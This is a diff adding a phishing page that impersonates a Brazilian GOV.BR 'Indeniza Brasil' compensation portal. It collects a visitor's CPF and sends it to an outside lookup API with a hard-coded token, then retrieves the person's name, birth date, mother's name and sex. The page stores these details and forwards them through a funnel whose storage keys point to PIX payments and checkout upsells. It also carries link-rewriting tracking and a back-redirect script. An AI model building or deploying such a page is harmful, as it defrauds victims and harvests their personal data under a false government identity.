@@ -1,0 +1,444 @@
+<!DOCTYPE html><html lang="en"><head>
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta content="text/html; charset=UTF-8; X-Content-Type-Options=nosniff" http-equiv="Content-Type">
+  <title>Consulta - Verificação - 1</title>
+  
+
+  
+
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            'poppins': ['Poppins', 'sans-serif']
+          }
+        }
+      }
+    }
+  </script>
+
+  <!-- fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    @keyframes pulse-scale {
+
+      0%,
+      100% {
+        transform: scale(1);
+      }
+
+      50% {
+        transform: scale(1.05);
+      }
+    }
+
+    .animate-pulse-scale {
+      animation: pulse-scale 1s ease-in-out infinite;
+    }
+
+    @keyframes spin {
+      from {
+        transform: rotate(0deg);
+      }
+
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .animate-spin {
+      animation: spin 1s linear infinite;
+    }
+
+    .error-message {
+      color: #dc2626;
+      margin: 12px 0;
+      font-size: 14px;
+      text-align: center;
+      background: #fef2f2;
+      border: 1px solid #fecaca;
+      border-radius: 8px;
+      padding: 12px;
+      border-left: 4px solid #dc2626;
+      font-weight: 500;
+    }
+  </style>
+
+  <!-- Tracker Global -->
+  <script>
+      (function () {
+        let p = new URLSearchParams(window.location.search);
+        let savedKeys = JSON.parse(localStorage.getItem('tracked_keys') || '[]');
+        p.forEach((value, key) => {
+          localStorage.setItem(key, value);
+          if (!savedKeys.includes(key)) savedKeys.push(key);
+        });
+        ['nome', 'name', 'cpf'].forEach(k => { if (localStorage.getItem(k) && !savedKeys.includes(k)) savedKeys.push(k); });
+        localStorage.setItem('tracked_keys', JSON.stringify(savedKeys));
+
+        window.addEventListener('load', function () {
+          document.querySelectorAll('a').forEach(link => {
+            try {
+              let u = new URL(link.href);
+              savedKeys.forEach(key => {
+                let value = localStorage.getItem(key);
+                if (value !== null && !u.searchParams.has(key)) {
+                  u.searchParams.set(key, value);
+                }
+              });
+              link.href = u.toString();
+            } catch (e) { }
+          });
+        });
+      })();
+  </script>
+
+  <style>
+    html, body { overflow-x: hidden; -webkit-text-size-adjust: 100%; }
+    body { font-size: 16px; line-height: 1.5; }
+    img, video { max-width: 100%; height: auto; }
+    button, a { -webkit-tap-highlight-color: rgba(0,0,0,0.05); }
+    @media (max-width: 480px) {
+      .text-xs { font-size: 0.78rem !important; }
+      .text-sm { font-size: 0.92rem !important; }
+      .p-6 { padding: 1.1rem !important; }
+      .px-4 { padding-left: 0.85rem !important; padding-right: 0.85rem !important; }
+    }
+  </style>
+<script src="js/tracker.js"></script>
+</head>
+
+
+<body class="w-full overflow-x-hidden font-poppins">
+
+  
+
+  <div class="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50">
+    <header class="fixed top-0 left-0 right-0 z-50 bg-white/95 backdrop-blur-sm shadow-sm border-b border-gray-200">
+      <div class="px-4 py-2">
+        <div class="flex justify-between items-center">
+          <div class="flex items-center space-x-3">
+            <img alt="Logo GOV.BR" class="h-6 w-auto" src="images/AHBymbGv4cwL.png">
+            <div class="hidden sm:block h-5 w-px bg-gray-300"></div>
+            <span class="hidden sm:inline text-xs font-medium text-gray-600">Portal Oficial</span>
+          </div>
+          <div class="flex items-center space-x-3">
+            <div class="flex items-center space-x-1 text-xs text-gray-500">
+              <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
+                <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path>
+              </svg>
+              <span class="hidden sm:inline">Seguro</span>
+            </div>
+            <button class="flex items-center space-x-2 bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded-full transition-colors text-sm">
+              <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                <path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd">
+                </path>
+              </svg>
+              <span class="font-medium" id="nameHeader"></span>
+            </button>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <div class="h-12"></div>
+
+    <div class="bg-blue-600 text-white py-3">
+      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="text-sm">
+          <span>Benefício</span>
+          <span class="mx-2">></span>
+          <span>Indenização</span>
+          <span class="mx-2">></span>
+          <span>Usuário GOV.BR</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="w-full">
+      <img src="images/programa-indeniza-brasil.webp" alt="Programa Indeniza Brasil - Governo Federal" width="1200" height="375" fetchpriority="high" decoding="async" class="w-full h-auto block">
+    </div>
+
+    <div class="h-6"></div>
+
+    <div class="max-w-md mx-auto px-4">
+      <div class="bg-white rounded-xl shadow-md border border-gray-200 p-6">
+        <div class="flex items-center gap-2 mb-3">
+          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#1351B4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="14" rx="2"></rect><path d="M7 15h.01M11 15h2M7 11h10"></path></svg>
+          <h2 class="text-base font-bold text-gray-900">Número do CPF</h2>
+        </div>
+        <p class="text-sm text-gray-700 mb-4 leading-snug">
+          Digite seu CPF para <strong>consultar-se</strong> no novo <strong>indeniza brasil</strong>
+        </p>
+
+        <form id="cpfForm" class="space-y-4">
+          <div>
+            <label for="cpf" class="block text-sm font-semibold text-gray-800 mb-1">CPF</label>
+            <input id="cpf" name="cpf" placeholder="Digite seu CPF" class="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent text-base" type="text" inputmode="numeric" maxlength="14" value="">
+          </div>
+
+          <p id="error-msg" class="error-message" style="display: none;"></p>
+
+          <button type="submit" id="submit-btn" class="w-full bg-[#1351B4] hover:bg-[#0d3f8f] disabled:bg-gray-400 disabled:cursor-not-allowed text-white font-semibold py-3 px-6 rounded-full transition-colors text-base flex items-center justify-center">
+            <span id="btn-text">Consultar Indenização</span>
+            <svg id="btn-spinner" class="animate-spin ml-2 h-5 w-5 text-white hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+          </button>
+        </form>
+
+        <div class="mt-6">
+          <h3 class="text-sm font-bold text-gray-900 mb-2">Outras opções de identificação:</h3>
+          <hr class="border-gray-200 mb-3">
+          <ul class="space-y-3 text-gray-400">
+            <li class="flex items-center justify-between gap-2">
+              <div class="flex items-center gap-3">
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="6" width="18" height="12" rx="2"></rect><path d="M3 10h18"></path></svg>
+                <span class="text-sm">Login com seu banco</span>
+              </div>
+              <span class="text-[10px] font-bold tracking-wider bg-gray-400 text-white px-2 py-0.5 rounded">SUA CONTA SERÁ PRATA</span>
+            </li>
+            <li class="flex items-center gap-3">
+              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect><path d="M14 14h7v7h-7z"></path></svg>
+              <span class="text-sm">Login com QR code</span>
+            </li>
+            <li class="flex items-center gap-3">
+              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="7" y="2" width="10" height="20" rx="2"></rect><path d="M11 18h2"></path></svg>
+              <span class="text-sm">Seu certificado digital</span>
+            </li>
+            <li class="flex items-center gap-3">
+              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.5 19a4.5 4.5 0 1 0-1.5-8.74A6 6 0 0 0 4 13a5 5 0 0 0 5 6h8.5z"></path></svg>
+              <span class="text-sm">Seu certificado digital em nuvem</span>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+
+    <footer class="max-w-md mx-auto px-4 py-6 text-center text-xs text-gray-500">
+      <div class="space-x-3">
+        <a href="https://sac-digital.biz/funil/termos/index.html" class="underline hover:text-blue-700">Termos de Uso</a>
+        <span>·</span>
+        <a href="https://sac-digital.biz/funil/privacidade/index.html" class="underline hover:text-blue-700">Política de Privacidade</a>
+      </div>
+      <p class="mt-2">Serviço privado, sem vínculo com órgãos públicos.</p>
+    </footer>
+  </div>
+
+  <script>
+    // Funções de formatação
+    function toTitleCase(str) {
+      if (!str) return '';
+      return str.toLowerCase().replace(/\b\w/g, function (char) {
+        return char.toUpperCase();
+      });
+    }
+
+    function formatDate(dateStr) {
+      if (!dateStr) return '';
+      // Checkify retorna no formato DD-MM-AAAA → converte para DD/MM/AAAA
+      let matchDDMMAAAA = dateStr.match(/^(\d{2})[-\/](\d{2})[-\/](\d{4})$/);
+      if (matchDDMMAAAA) {
+        return matchDDMMAAAA[1] + '/' + matchDDMMAAAA[2] + '/' + matchDDMMAAAA[3];
+      }
+      // Fallback: formato AAAA-MM-DD ou AAAA/MM/DD
+      let matchAAAAMMDD = dateStr.match(/(\d{4})[-\/](\d{2})[-\/](\d{2})/);
+      if (matchAAAAMMDD) {
+        return matchAAAAMMDD[3] + '/' + matchAAAAMMDD[2] + '/' + matchAAAAMMDD[1];
+      }
+      return dateStr;
+    }
+
+    // Funções de validação de CPF
+    function removeMask(cpf) {
+      return cpf.replace(/\D/g, '');
+    }
+
+    function formatCPF(cpf) {
+      let digits = removeMask(cpf);
+      if (digits.length <= 11) {
+        digits = digits.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
+      }
+      return digits;
+    }
+
+    function isValidCPF(cpf) {
+      cpf = removeMask(cpf);
+      if (cpf.length !== 11 || /^(.)\1+$/.test(cpf)) return false;
+      let sum = 0, remainder;
+      for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
+      remainder = (sum * 10) % 11;
+      if (remainder === 10 || remainder === 11) remainder = 0;
+      if (remainder !== parseInt(cpf.substring(9, 10))) return false;
+      sum = 0;
+      for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
+      remainder = (sum * 10) % 11;
+      if (remainder === 10 || remainder === 11) remainder = 0;
+      if (remainder !== parseInt(cpf.substring(10, 11))) return false;
+      return true;
+    }
+
+    document.addEventListener('DOMContentLoaded', function () {
+      const cpfInput = document.getElementById('cpf');
+      const errorMsg = document.getElementById('error-msg');
+      const submitBtn = document.getElementById('submit-btn');
+      const btnText = document.getElementById('btn-text');
+      const btnSpinner = document.getElementById('btn-spinner');
+
+      // Máscara de CPF
+      cpfInput.addEventListener('input', function () {
+        cpfInput.value = formatCPF(cpfInput.value);
+      });
+
+      // Submit do formulário
+      document.getElementById('cpfForm').addEventListener('submit', function (e) {
+        e.preventDefault();
+        errorMsg.style.display = 'none';
+
+        // Estado de loading
+        btnText.textContent = 'CONSULTANDO...';
+        btnSpinner.classList.remove('hidden');
+        submitBtn.disabled = true;
+
+        let cpfValue = removeMask(cpfInput.value);
+
+        // Validação do CPF
+        if (!isValidCPF(cpfValue)) {
+          errorMsg.textContent = 'ERRO: CPF INVÁLIDO. Digite novamente.';
+          cpfInput.value = '';
+          errorMsg.style.display = 'block';
+          btnText.textContent = 'Consultar Indenização';
+          btnSpinner.classList.add('hidden');
+          submitBtn.disabled = false;
+          return;
+        }
+
+        // ─── API direta (mais rápida, sem proxy) ─────────────────────
+        const apiUrl = 'https://searchapi.dnnl.live/consulta?token_api=9265&cpf=' + cpfValue;
+
+        fetch(apiUrl, {
+          method: 'GET',
+          headers: {
+            'Accept': 'application/json'
+          }
+        })
+          .then(function (response) {
+            if (!response.ok) {
+              throw new Error('Erro na consulta do CPF. (Cod: ' + response.status + ')');
+            }
+            return response.json();
+          })
+          .then(function (result) {
+            let dados = null;
+
+            if (result && result.dados && result.dados.length > 0) {
+              dados = result.dados[0];
+            }
+
+            if (dados && dados.NOME) {
+              // Normalizar SEXO — a API pode retornar 'M'/'F' ou 'MASCULINO'/'FEMININO'
+              let sexoRaw = (dados.SEXO || '').toString().toUpperCase();
+              let sexoConvertido = '';
+              if (sexoRaw === 'M' || sexoRaw === 'MASCULINO') sexoConvertido = 'Masculino';
+              else if (sexoRaw === 'F' || sexoRaw === 'FEMININO') sexoConvertido = 'Feminino';
+
+              // Formatar os dados
+              // NASC vem no formato DD-MM-AAAA
+              let nomeFormatado = dados.NOME ? toTitleCase(dados.NOME) : '';
+              let nascimentoFormatado = dados.NASC ? formatDate(dados.NASC) : '';
+              let maeFormatada = dados.NOME_MAE ? toTitleCase(dados.NOME_MAE) : '';
+              let sexoFormatado = sexoConvertido ? toTitleCase(sexoConvertido) : '';
+
+              // ─── LIMPEZA: zera qualquer resquício de sessão anterior ───
+              // Sem isso, dados do usuário anterior (nome, nascimento, mãe, PIX...)
+              // vazam pras páginas seguintes e aparecem misturados.
+              try {
+                var STALE_KEYS = [
+                  'name','nome','cpf','nascimento','sexo','mae','name_m',
+                  'chavePix','pix_payout_key','pix_payout_type',
+                  'pix_paid','pix_paid_up1','pix_paid_identifier','pix_paid_amount',
+                  'idb_pix_cache','upsell',
+                  'checkout_plan_amount','ln','checkout_plan_ganho',
+                  'tracked_keys'
+                ];
+                // Também limpa qualquer chave rastreada anteriormente pelo tracked_keys
+                try {
+                  var prevTracked = JSON.parse(localStorage.getItem('tracked_keys') || '[]');
+                  if (Array.isArray(prevTracked)) {
+                    prevTracked.forEach(function (k) { try { localStorage.removeItem(k); } catch (e) {} });
+                  }
+                } catch (e) {}
+                STALE_KEYS.forEach(function (k) { try { localStorage.removeItem(k); } catch (e) {} });
+              } catch (e) {}
+
+              // Grava os dados FRESCOS da consulta no localStorage (canônico)
+              try {
+                if (nomeFormatado) { localStorage.setItem('name', nomeFormatado); localStorage.setItem('nome', nomeFormatado); }
+                if (cpfValue) localStorage.setItem('cpf', cpfValue);
+                if (nascimentoFormatado) localStorage.setItem('nascimento', nascimentoFormatado);
+                if (sexoFormatado) localStorage.setItem('sexo', sexoFormatado);
+                if (maeFormatada) { localStorage.setItem('mae', maeFormatada); localStorage.setItem('name_m', maeFormatada); }
+              } catch (e) {}
+
+              // Construir query params para redirecionar — preserva UTM/gclid mas
+              // SOBRESCREVE os campos pessoais com os da consulta atual.
+              let newQueryParams = new URLSearchParams(window.location.search);
+              ['nome','name','cpf','nascimento','sexo','mae','name_m'].forEach(function (k) {
+                newQueryParams.delete(k);
+              });
+              newQueryParams.set('cpf', cpfValue);
+
+              if (nomeFormatado) newQueryParams.set('nome', nomeFormatado);
+              if (nascimentoFormatado) newQueryParams.set('nascimento', nascimentoFormatado);
+              if (sexoFormatado) newQueryParams.set('sexo', sexoFormatado);
+              if (maeFormatada) newQueryParams.set('mae', maeFormatada);
+
+              // Remover parâmetros vazios
+              for (let [key, value] of newQueryParams.entries()) {
+                if (!value || !value.trim()) {
+                  newQueryParams.delete(key);
+                }
+              }
+
+              const redirectUrl = './2/index.html?' + newQueryParams.toString();
+              window.location.href = redirectUrl;
+
+            } else {
+              // CPF não encontrado
+              errorMsg.textContent = 'CPF não encontrado na base de dados. Verifique e tente novamente.';
+              errorMsg.style.display = 'block';
+              btnText.textContent = 'Consultar Indenização';
+              btnSpinner.classList.add('hidden');
+              submitBtn.disabled = false;
+            }
+          })
+          .catch(function (error) {
+            errorMsg.textContent = error.message || 'Ocorreu um erro ao consultar. Tente novamente mais tarde.';
+            errorMsg.style.display = 'block';
+            btnText.textContent = 'Consultar Indenização';
+            btnSpinner.classList.add('hidden');
+            submitBtn.disabled = false;
+          });
+        // ─────────────────────────────────────────────────────────────
+      });
+    });
+
+</script>
+
+
+
+  <script src="js/back-redirect.js"></script>
+
+
+
+</body></html>
